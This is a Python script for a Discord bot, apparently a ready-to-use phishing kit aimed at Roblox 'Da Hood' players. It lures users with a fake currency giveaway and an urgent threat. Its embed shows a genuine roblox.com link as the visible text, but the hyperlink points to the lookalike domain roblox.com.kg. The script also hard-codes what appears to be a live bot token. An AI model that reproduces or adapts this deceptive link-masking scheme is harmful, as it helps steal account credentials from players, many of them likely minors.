import discord
from discord.ext import commands
import requests


################### change these to your liking ###################

token = "MTI1NjY3Njc1MDYyMTE1MTI1Mw.GH9gYR.dSo2yvruzBsGKsKGjIvkll96OIFxi8nJ78cgvE"
prefix = "!"
title = "DHC dropped successfully!"
desc ="Join the private server below to get your DHC within 10 minutes, or cash will be deleted."
field = "Join the private server below:"
hyperlink = "https://roblox.com/games/2788229376/Da-Hood?privateServerLinkCode=42052766423889484566139180078459"
phish = "https://roblox.com.kg/games/2788229376/Da-Hood?privateServerLinkCode=42052766423889484566139180078459"

###################################################################



client = commands.Bot(command_prefix = prefix)
client.remove_command('help')

@client.event
async def on_ready():
    print('')
    print('----------------')
    print('Bot Online!')
    print('----------------')

#change color and imageurl if you want#

main = discord.Embed(title=title,description=desc,color=3066993)
main.add_field(name=field,value=f"[{hyperlink}]({phish})")

image = main.set_image(url="https://api.creavite.co/out/nQO9N7GD4orcrcoa_static.png")
thumbnail = main.set_thumbnail(url="https://cms-assets.tutsplus.com/cdn-cgi/image/width=1700/uploads/users/523/posts/32694/final_image/tutorial-preview-large.png")

#redefine dhc if you want a different command#


@client.command()
async def dhc(ctx):
    await ctx.send('Sent DHC in private server, check your DMs.')
    await ctx.author.send(embed=main)





client.run(token)
